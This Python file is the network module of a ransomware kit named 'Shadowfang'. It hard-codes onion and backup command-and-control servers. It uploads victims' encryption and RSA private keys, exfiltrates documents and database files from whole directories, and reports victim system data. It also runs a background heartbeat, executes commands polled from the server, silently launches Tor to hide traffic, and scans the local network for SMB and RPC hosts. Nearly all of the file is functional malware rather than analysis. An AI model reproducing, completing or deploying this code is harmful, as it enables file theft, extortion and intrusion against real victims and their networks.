#!/usr/bin/env python3
"""
SHADOWFANG CORE - NETWORK.PY
Complete C2 communication module
Encrypted data exfiltration, status reporting, key transmission, Tor support
"""

import os
import sys
import time
import json
import base64
import socket
import struct
import threading
import subprocess
from datetime import datetime
from urllib import request, parse, error
from core import CoreUtils, WinAPI, Constants, logger

# ==================== NETWORK CONSTANTS ====================

class NetworkConstants:
    """Network configuration constants"""
    
    # C2 Servers
    C2_SERVERS = [
        "https://c2-shadowfang-1.onion",
        "https://c2-shadowfang-2.onion",
        "https://backup-c2.shadowfang.net"
    ]
    
    # Communication
    USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    TIMEOUT = 30
    RETRY_ATTEMPTS = 3
    RETRY_DELAY = 5
    HEARTBEAT_INTERVAL = 300  # 5 minutes
    
    # Tor
    TOR_PROXY = "127.0.0.1:9050"
    TOR_SOCKS_PORT = 9050
    TOR_CONTROL_PORT = 9051
    
    # Encryption
    AES_KEY_SIZE = 32
    HMAC_KEY_SIZE = 32
    
    # Endpoints
    ENDPOINT_UPLOAD_KEYS = "/api/v1/keys"
    ENDPOINT_REPORT = "/api/v1/report"
    ENDPOINT_HEARTBEAT = "/api/v1/heartbeat"
    ENDPOINT_COMMAND = "/api/v1/command"
    ENDPOINT_DOWNLOAD = "/api/v1/download"

# ==================== ENCRYPTED COMMUNICATOR ====================

class EncryptedCommunicator:
    """Encrypted communication with C2 server"""
    
    def __init__(self, encryption_key=None):
        self.encryption_key = encryption_key or os.urandom(32)
        self.session_id = None
        self.connected = False
    
    def encrypt_payload(self, data):
        """Encrypt payload for transmission"""
        try:
            import hashlib
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.primitives import padding
            
            # Generate IV
            iv = os.urandom(16)
            
            # Serialize data
            if isinstance(data, dict):
                data = json.dumps(data).encode()
            elif isinstance(data, str):
                data = data.encode()
            
            # Create cipher
            cipher = Cipher(
                algorithms.AES(self.encryption_key),
                modes.CBC(iv)
            )
            encryptor = cipher.encryptor()
            
            # Pad data
            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(data) + padder.finalize()
            
            # Encrypt
            encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
            
            # Combine IV + encrypted data
            payload = iv + encrypted_data
            
            # Base64 encode
            return base64.b64encode(payload).decode()
            
        except Exception as e:
            logger.error(f"Payload encryption failed: {e}")
            return None
    
    def decrypt_payload(self, encrypted_payload):
        """Decrypt payload from C2 server"""
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.primitives import padding
            
            # Base64 decode
            payload = base64.b64decode(encrypted_payload)
            
            # Extract IV and encrypted data
            iv = payload[:16]
            encrypted_data = payload[16:]
            
            # Create cipher
            cipher = Cipher(
                algorithms.AES(self.encryption_key),
                modes.CBC(iv)
            )
            decryptor = cipher.decryptor()
            
            # Decrypt
            decrypted_padded = decryptor.update(encrypted_data) + decryptor.finalize()
            
            # Unpad
            unpadder = padding.PKCS7(128).unpadder()
            decrypted_data = unpadder.update(decrypted_padded) + unpadder.finalize()
            
            return decrypted_data.decode()
            
        except Exception as e:
            logger.error(f"Payload decryption failed: {e}")
            return None

# ==================== HTTP COMMUNICATOR ====================

class HTTPCommunicator:
    """HTTP/HTTPS communication with C2 server"""
    
    def __init__(self, server_url=None):
        self.server_url = server_url or NetworkConstants.C2_SERVERS[0]
        self.session = None
        self.headers = {
            'User-Agent': NetworkConstants.USER_AGENT,
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        }
    
    def send_post(self, endpoint, data, use_tor=False):
        """Send POST request to C2 server"""
        try:
            url = f"{self.server_url}{endpoint}"
            
            # Prepare data
            if isinstance(data, dict):
                data = json.dumps(data).encode()
            elif isinstance(data, str):
                data = data.encode()
            
            # Create request
            req = request.Request(
                url,
                data=data,
                headers=self.headers,
                method='POST'
            )
            
            # Use Tor proxy if requested
            if use_tor:
                proxy_handler = request.ProxyHandler({
                    'http': f'socks5h://{NetworkConstants.TOR_PROXY}',
                    'https': f'socks5h://{NetworkConstants.TOR_PROXY}'
                })
                opener = request.build_opener(proxy_handler)
            else:
                opener = request.build_opener()
            
            # Send request
            response = opener.open(req, timeout=NetworkConstants.TIMEOUT)
            
            # Read response
            response_data = response.read().decode()
            
            return response_data
            
        except Exception as e:
            logger.error(f"POST request failed: {e}")
            return None
    
    def send_get(self, endpoint, use_tor=False):
        """Send GET request to C2 server"""
        try:
            url = f"{self.server_url}{endpoint}"
            
            # Create request
            req = request.Request(
                url,
                headers=self.headers,
                method='GET'
            )
            
            # Use Tor proxy if requested
            if use_tor:
                proxy_handler = request.ProxyHandler({
                    'http': f'socks5h://{NetworkConstants.TOR_PROXY}',
                    'https': f'socks5h://{NetworkConstants.TOR_PROXY}'
                })
                opener = request.build_opener(proxy_handler)
            else:
                opener = request.build_opener()
            
            # Send request
            response = opener.open(req, timeout=NetworkConstants.TIMEOUT)
            
            # Read response
            response_data = response.read().decode()
            
            return response_data
            
        except Exception as e:
            logger.error(f"GET request failed: {e}")
            return None
    
    def test_connection(self):
        """Test connection to C2 server"""
        try:
            response = self.send_get("/api/v1/ping")
            return response is not None
        except:
            return False
    
    def switch_server(self):
        """Switch to backup C2 server"""
        try:
            current_index = NetworkConstants.C2_SERVERS.index(self.server_url)
            next_index = (current_index + 1) % len(NetworkConstants.C2_SERVERS)
            self.server_url = NetworkConstants.C2_SERVERS[next_index]
            logger.info(f"Switched to backup C2 server: {self.server_url}")
            return True
        except:
            return False

# ==================== DATA EXFILTRATOR ====================

class DataExfiltrator:
    """Exfiltrate data to C2 server"""
    
    def __init__(self, communicator=None):
        self.communicator = communicator or HTTPCommunicator()
        self.exfiltrated_files = []
        self.failed_files = []
        self.total_bytes_sent = 0
    
    def upload_encryption_keys(self, victim_id, encryption_key, rsa_private_key=None):
        """Upload encryption keys to C2 server"""
        try:
            payload = {
                'victim_id': victim_id,
                'timestamp': datetime.now().isoformat(),
                'encryption_key': base64.b64encode(encryption_key).decode() if encryption_key else None,
                'rsa_private_key': rsa_private_key
            }
            
            response = self.communicator.send_post(
                NetworkConstants.ENDPOINT_UPLOAD_KEYS,
                payload
            )
            
            if response:
                logger.info("Encryption keys uploaded to C2")
                return True
            
            return False
            
        except Exception as e:
            logger.error(f"Key upload failed: {e}")
            return False
    
    def upload_victim_info(self, victim_info):
        """Upload victim system information"""
        try:
            payload = {
                'type': 'victim_info',
                'data': victim_info,
                'timestamp': datetime.now().isoformat()
            }
            
            response = self.communicator.send_post(
                NetworkConstants.ENDPOINT_REPORT,
                payload
            )
            
            if response:
                logger.info("Victim info uploaded")
                return True
            
            return False
            
        except Exception as e:
            logger.error(f"Victim info upload failed: {e}")
            return False
    
    def upload_encryption_report(self, report_data):
        """Upload encryption status report"""
        try:
            payload = {
                'type': 'encryption_report',
                'data': report_data,
                'timestamp': datetime.now().isoformat()
            }
            
            response = self.communicator.send_post(
                NetworkConstants.ENDPOINT_REPORT,
                payload
            )
            
            if response:
                logger.info("Encryption report uploaded")
                return True
            
            return False
            
        except Exception as e:
            logger.error(f"Report upload failed: {e}")
            return False
    
    def upload_file(self, filepath, max_size=10*1024*1024):
        """Upload file to C2 server"""
        try:
            # Check file size
            file_size = os.path.getsize(filepath)
            if file_size > max_size:
                logger.warning(f"File too large for upload: {filepath}")
                return False
            
            # Read file
            with open(filepath, 'rb') as f:
                file_data = f.read()
            
            # Encode file
            encoded_data = base64.b64encode(file_data).decode()
            
            payload = {
                'type': 'file',
                'filename': os.path.basename(filepath),
                'size': file_size,
                'data': encoded_data,
                'timestamp': datetime.now().isoformat()
            }
            
            response = self.communicator.send_post(
                NetworkConstants.ENDPOINT_UPLOAD_KEYS,
                payload
            )
            
            if response:
                self.exfiltrated_files.append(filepath)
                self.total_bytes_sent += file_size
                logger.info(f"File exfiltrated: {filepath}")
                return True
            
            self.failed_files.append(filepath)
            return False
            
        except Exception as e:
            self.failed_files.append(filepath)
            logger.error(f"File upload failed: {e}")
            return False
    
    def exfiltrate_directory(self, directory, extensions=None, max_size=10*1024*1024):
        """Exfiltrate all matching files in directory"""
        if not extensions:
            extensions = ['.doc', '.docx', '.xls', '.xlsx', '.pdf', '.db', '.sql']
        
        exfiltrated_count = 0
        
        try:
            for root, dirs, files in os.walk(directory):
                for file in files:
                    if any(file.lower().endswith(ext) for ext in extensions):
                        filepath = os.path.join(root, file)
                        if self.upload_file(filepath, max_size):
                            exfiltrated_count += 1
            
            return exfiltrated_count
            
        except Exception as e:
            logger.error(f"Directory exfiltration failed: {e}")
            return exfiltrated_count

# ==================== HEARTBEAT ====================

class Heartbeat:
    """Maintain connection with C2 server"""
    
    def __init__(self, communicator=None):
        self.communicator = communicator or HTTPCommunicator()
        self.heartbeat_thread = None
        self.stop_heartbeat = False
        self.last_heartbeat = None
    
    def send_heartbeat(self, victim_id, status_data=None):
        """Send heartbeat to C2 server"""
        try:
            payload = {
                'victim_id': victim_id,
                'status': status_data or 'alive',
                'timestamp': datetime.now().isoformat()
            }
            
            response = self.communicator.send_post(
                NetworkConstants.ENDPOINT_HEARTBEAT,
                payload
            )
            
            if response:
                self.last_heartbeat = datetime.now()
                return True
            
            return False
            
        except Exception as e:
            logger.error(f"Heartbeat failed: {e}")
            return False
    
    def start_heartbeat(self, victim_id, interval=300):
        """Start heartbeat in background thread"""
        if self.heartbeat_thread and self.heartbeat_thread.is_alive():
            return True
        
        self.stop_heartbeat = False
        
        def heartbeat_worker():
            while not self.stop_heartbeat:
                self.send_heartbeat(victim_id)
                time.sleep(interval)
        
        self.heartbeat_thread = threading.Thread(target=heartbeat_worker)
        self.heartbeat_thread.daemon = True
        self.heartbeat_thread.start()
        
        logger.info(f"Heartbeat started (interval: {interval}s)")
        return True
    
    def stop(self):
        """Stop heartbeat"""
        self.stop_heartbeat = True
        if self.heartbeat_thread:
            self.heartbeat_thread.join(timeout=2)
        logger.info("Heartbeat stopped")

# ==================== COMMAND RECEIVER ====================

class CommandReceiver:
    """Receive commands from C2 server"""
    
    def __init__(self, communicator=None):
        self.communicator = communicator or HTTPCommunicator()
        self.command_thread = None
        self.stop_receiving = False
        self.command_handlers = {}
    
    def register_handler(self, command, handler):
        """Register command handler"""
        self.command_handlers[command] = handler
    
    def check_commands(self, victim_id):
        """Check for new commands from C2"""
        try:
            response = self.communicator.send_get(
                f"{NetworkConstants.ENDPOINT_COMMAND}?victim_id={victim_id}"
            )
            
            if response:
                commands = json.loads(response)
                
                for command in commands:
                    cmd_type = command.get('type')
                    cmd_data = command.get('data')
                    
                    if cmd_type in self.command_handlers:
                        handler = self.command_handlers[cmd_type]
                        handler(cmd_data)
            
            return True
            
        except Exception as e:
            logger.error(f"Command check failed: {e}")
            return False
    
    def start_listening(self, victim_id, interval=60):
        """Start command listening in background thread"""
        if self.command_thread and self.command_thread.is_alive():
            return True
        
        self.stop_receiving = False
        
        def command_worker():
            while not self.stop_receiving:
                self.check_commands(victim_id)
                time.sleep(interval)
        
        self.command_thread = threading.Thread(target=command_worker)
        self.command_thread.daemon = True
        self.command_thread.start()
        
        return True
    
    def stop(self):
        """Stop command listening"""
        self.stop_receiving = True
        if self.command_thread:
            self.command_thread.join(timeout=2)

# ==================== TOR MANAGER ====================

class TorManager:
    """Tor network management"""
    
    def __init__(self):
        self.tor_available = False
        self.tor_process = None
    
    def check_tor(self):
        """Check if Tor is available"""
        try:
            # Check if Tor is running
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex(('127.0.0.1', NetworkConstants.TOR_SOCKS_PORT))
            sock.close()
            
            self.tor_available = result == 0
            return self.tor_available
        except:
            return False
    
    def start_tor(self):
        """Start Tor process"""
        try:
            tor_paths = [
                'tor.exe',
                'C:\\Tor\\tor.exe',
                'C:\\Program Files\\Tor\\tor.exe'
            ]
            
            for tor_path in tor_paths:
                if os.path.exists(tor_path):
                    self.tor_process = subprocess.Popen(
                        [tor_path],
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                    
                    # Wait for Tor to start
                    time.sleep(5)
                    
                    if self.check_tor():
                        logger.info("Tor started successfully")
                        return True
            
            return False
            
        except Exception as e:
            logger.error(f"Tor start failed: {e}")
            return False
    
    def stop_tor(self):
        """Stop Tor process"""
        try:
            if self.tor_process:
                self.tor_process.terminate()
                self.tor_process = None
            return True
        except:
            return False
    
    def route_through_tor(self):
        """Route all traffic through Tor"""
        try:
            # Set environment variables for Tor proxy
            os.environ['HTTP_PROXY'] = f'socks5h://{NetworkConstants.TOR_PROXY}'
            os.environ['HTTPS_PROXY'] = f'socks5h://{NetworkConstants.TOR_PROXY}'
            os.environ['ALL_PROXY'] = f'socks5h://{NetworkConstants.TOR_PROXY}'
            
            return True
        except:
            return False

# ==================== NETWORK SCANNER ====================

class NetworkScanner:
    """Scan local network for targets"""
    
    def __init__(self):
        self.local_ip = None
        self.network_range = None
        self.discovered_hosts = []
    
    def get_local_ip(self):
        """Get local IP address"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.connect(('8.8.8.8', 80))
            self.local_ip = sock.getsockname()[0]
            sock.close()
            return self.local_ip
        except:
            return None
    
    def get_network_range(self):
        """Calculate network range from local IP"""
        if not self.local_ip:
            self.get_local_ip()
        
        if self.local_ip:
            parts = self.local_ip.split('.')
            self.network_range = f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
            return self.network_range
        
        return None
    
    def scan_network(self, ports=[445, 139, 135]):
        """Scan network for vulnerable hosts"""
        try:
            if not self.network_range:
                self.get_network_range()
            
            self.discovered_hosts = []
            
            # Simple ping sweep
            base_ip = self.local_ip.rsplit('.', 1)[0]
            
            for i in range(1, 255):
                ip = f"{base_ip}.{i}"
                
                # Skip own IP
                if ip == self.local_ip:
                    continue
                
                # Check if host is alive
                for port in ports:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        result = sock.connect_ex((ip, port))
                        sock.close()
                        
                        if result == 0:
                            self.discovered_hosts.append({
                                'ip': ip,
                                'port': port,
                                'timestamp': datetime.now().isoformat()
                            })
                            break
                    except:
                        continue
            
            logger.info(f"Discovered {len(self.discovered_hosts)} hosts")
            return self.discovered_hosts
            
        except Exception as e:
            logger.error(f"Network scan failed: {e}")
            return []

# ==================== MAIN NETWORK MANAGER ====================

class NetworkManager:
    """Main network communication orchestrator"""
    
    def __init__(self):
        self.communicator = HTTPCommunicator()
        self.encrypted_comm = EncryptedCommunicator()
        self.exfiltrator = DataExfiltrator(self.communicator)
        self.heartbeat = Heartbeat(self.communicator)
        self.command_receiver = CommandReceiver(self.communicator)
        self.tor_manager = TorManager()
        self.scanner = NetworkScanner()
        self.connected = False
    
    def initialize(self, victim_id=None):
        """Initialize network communication"""
        logger.info("Initializing network communication...")
        
        # Check Tor availability
        if self.tor_manager.check_tor():
            logger.info("Tor available - routing through Tor")
            self.tor_manager.route_through_tor()
        else:
            logger.info("Tor not available - using direct connection")
        
        # Test connection to C2
        if self.communicator.test_connection():
            self.connected = True
            logger.info("Connected to C2 server")
            return True
        
        # Try backup servers
        for _ in range(len(NetworkConstants.C2_SERVERS)):
            if self.communicator.switch_server():
                if self.communicator.test_connection():
                    self.connected = True
                    logger.info(f"Connected to backup C2: {self.communicator.server_url}")
                    return True
        
        logger.warning("Failed to connect to any C2 server")
        return False
    
    def send_keys(self, victim_id, encryption_key, rsa_key=None):
        """Send encryption keys to C2"""
        if not self.connected:
            return False
        
        return self.exfiltrator.upload_encryption_keys(
            victim_id, encryption_key, rsa_key
        )
    
    def send_report(self, report_data):
        """Send status report to C2"""
        if not self.connected:
            return False
        
        return self.exfiltrator.upload_encryption_report(report_data)
    
    def send_victim_info(self, victim_info):
        """Send victim information"""
        if not self.connected:
            return False
        
        return self.exfiltrator.upload_victim_info(victim_info)
    
    def start_heartbeat(self, victim_id):
        """Start heartbeat with C2"""
        return self.heartbeat.start_heartbeat(victim_id)
    
    def start_command_listener(self, victim_id):
        """Start command listener"""
        return self.command_receiver.start_listening(victim_id)
    
    def register_command(self, command, handler):
        """Register command handler"""
        self.command_receiver.register_handler(command, handler)
    
    def scan_network(self):
        """Scan local network"""
        return self.scanner.scan_network()
    
    def shutdown(self):
        """Shutdown network communication"""
        self.heartbeat.stop()
        self.command_receiver.stop()
        self.tor_manager.stop_tor()
        logger.info("Network communication shut down")

# ==================== SINGLETON INSTANCE ====================

network_manager = NetworkManager()

# ==================== EXPORT ====================

__all__ = [
    'EncryptedCommunicator',
    'HTTPCommunicator',
    'DataExfiltrator',
    'Heartbeat',
    'CommandReceiver',
    'TorManager',
    'NetworkScanner',
    'NetworkManager',
    'network_manager'
]